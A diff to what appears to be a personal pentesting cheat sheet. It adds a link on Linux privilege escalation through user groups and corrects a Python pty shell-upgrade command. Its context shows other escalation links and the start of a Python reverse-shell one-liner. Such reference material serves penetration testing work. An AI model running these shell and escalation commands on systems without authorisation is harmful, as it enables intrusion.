@@ -54,6 +54,7 @@ A collection of links and payloads I stored for quick access
 - [**GTFO bins**](https://gtfobins.github.io/)
 - [**LXD Privillage Escalation**](https://www.hackingarticles.in/lxd-privilege-escalation/)
 - [**LXD Exploatation**](https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/)
+- [**Exploiting User Groups**](https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/)
 - [**Escape from Restrictd Shells**](https://0xffsec.com/handbook/shells/restricted-shells/)
 - [**Traitor**](https://github.com/liamg/traitor)
 - [**Python Library Hijacking on Linux**](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
@@ -147,7 +148,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 #### Bash
 ```python
-python(3) -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 ```cmd
 Ctrl-Z
